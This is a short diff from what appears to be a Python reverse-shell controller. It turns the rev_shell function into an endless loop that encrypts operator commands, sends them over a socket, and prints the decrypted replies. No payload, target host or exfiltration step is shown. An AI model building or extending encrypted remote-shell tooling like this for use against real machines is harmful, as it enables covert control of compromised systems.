@@ -41,14 +41,14 @@ def receive(key, iv, serversocket):
         print(message)
 
 def rev_shell(key, iv, bs, connection):
-    command = input('$ ')
-    command = do_encrypt(key, iv, bs, command)
-    connection.send(command)
-    data = connection.recv(2048)
-    if len(data) > 0:
-        message = do_decrypt(key, iv, data)
-        #message = message.decode('utf-8')
-        print(message)
+    while True:
+        command = input('$ ')
+        command = do_encrypt(key, iv, bs, command)
+        connection.send(command)
+        data = connection.recv(2048)
+        if len(data) > 0:
+            message = do_decrypt(key, iv, data)
+            print(message)
 
 
 def main(port, key, iv, bs):
